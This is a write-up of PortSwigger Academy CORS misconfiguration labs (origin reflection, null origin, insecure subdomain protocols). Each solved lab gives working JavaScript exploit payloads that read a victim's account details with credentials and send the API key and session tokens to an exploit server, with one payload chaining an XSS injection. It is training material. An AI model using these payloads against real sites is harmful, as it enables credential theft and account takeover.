# Cross-origin resource sharing (CORS)

## Basics

### CORS vulnerability with basic origin reflection

#### Description

The Academy website for this lab has an insecure CORS configuration in that it trusts all origins. 

#### Proof of Concept

1. Start Burp, foxyproxy, and with intercept off, log in to the target site and access your account page.

![CORS](../../_static/images/cors1.png)

2. Review the **HTTPhistory** in Burp: The key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.

![CORS](../../_static/images/cors2.png)

3. Send the request to **Burp Repeater**, and resubmit it with the added header:

```text
Origin: https://whatever.com
```

![CORS](../../_static/images/cors3.png)

The origin is reflected in the `Access-Control-Allow-Origin` header, meaning the application allows an arbitrary (public) origin, and `Access-Control-Allow-Credentials` is also true.

4. Create exploit (replacing `lab-id`):

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://lab-id.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

5. Paste the exploit in the `body` field of the form in the exploit server.
6. Click **View exploit** and check you land on the log page and your API key is in the URL. 
7. **Deliver exploit to victim**.
8. Go to **Access log**

```text
...
10.0.3.246      2023-01-02 21:51:33 +0000 "GET /exploit/ HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
10.0.3.246      2023-01-02 21:51:33 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22PY3qD4pkDMg4WDq1CZvntWDlPE0TFUyV%22,%20%20%22sessions%22:%20[%20%20%20%20%22pEGInv0rQCAB3vDmrgkuharW591raOlV%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
10.0.3.246      2023-01-02 21:51:33 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
```

9. Copy the administrator's API key, and enter it as solution to the lab.

#### Exploitability

To exploit this vulnerability, an attacker would have to create an exploit from a well-know template. Then, the attacker would need to convince the administrator into visiting the page with the exploit, potentially giving the attacker access to the administrator's account and all associated privileges and resources.

#### Impact

The attacker could disable account notifications, enable 2FA to lock them out, and transfer their data to an arbitrary address.

#### Remediation

An attacker can directly forge a request from any trusted origin. Apply protections to sensitive data, such as authentication and session management, in addition to configuring CORS.

----

### CORS vulnerability with trusted null origin

#### Description

This website has an insecure CORS configuration in that it trusts the `null` origin. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key. You can log in to your own account using the following credentials: `wiener:peter` 

#### Proof of Concept

1. Start Burp, foxyproxy, and with intercept off, log in to the target site and access your account page.
2. In Burp, review the **HTTPhistory**. The API key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Send the request to **Burp Repeater**, and resubmit it with the added header `Origin: null`. The "null" origin is reflected in the Access-Control-Allow-Origin header of the response.
4. Create exploit (replacing `lab-id` and `exploit-server-id`). The iframe sandbox generates a null origin request.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://lab-id.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-server-id.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

5. Go to the exploit server and enter the exploit in the body field of the form.
6. Click **View exploit** and check you land on the log page and your API key is in the URL. 
7. **Deliver exploit to victim**.
8. Go to **Access log**
9. Copy the administrator's API key, and enter it as solution to the lab.

## Practitioner

### CORS vulnerability with trusted insecure protocols

#### Description

The website of this lab has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol. 

_If an on-path attack (MitM) between server and victim was possible, a connection to an insecure subdomain could be hijacked, and malicious JavaScript injected to exploit the CORS configuration. Unfortunately, in this lab environment on-path is not possible, so we use an alternative way of injecting JavaScript into the subdomain._

#### Proof of Concept

1. Start Burp, foxyproxy, and with intercept off, log in to the target site and access your account page.
2. In Burp, review the history. The API key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Send the request to Burp Repeater, and resubmit it with the added header `Origin: http://subdomain.lab-id` where `lab-id` is the lab domain name. The origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
4. Open a product page, click **Check stock**. It is loaded using a HTTP URL on a subdomain, and the `productID` parameter is vulnerable to [XSS](xss.md). 
5. Create exploit ((replacing `lab-id` and `exploit-server-id`):

```html
<script>
    document.location="http://stock.lab-id.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://lab-id.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-server-id.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

6. Go to the exploit server and enter the exploit in the body field of the form.
7. Click **View exploit** and check you land on the log page and your API key is in the URL. 
8. **Deliver exploit to victim**.
9. Go to **Access log**
10. Copy the administrator's API key, and enter it as solution to the lab.

## Expert

### CORS vulnerability with internal network pivot attack

#### Description

The website of this lab has an insecure CORS configuration in that it trusts all internal network origins, and requires multiple steps to complete. 

_Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. The provided exploit server and/or Burp Collaborator's default public server must be used._


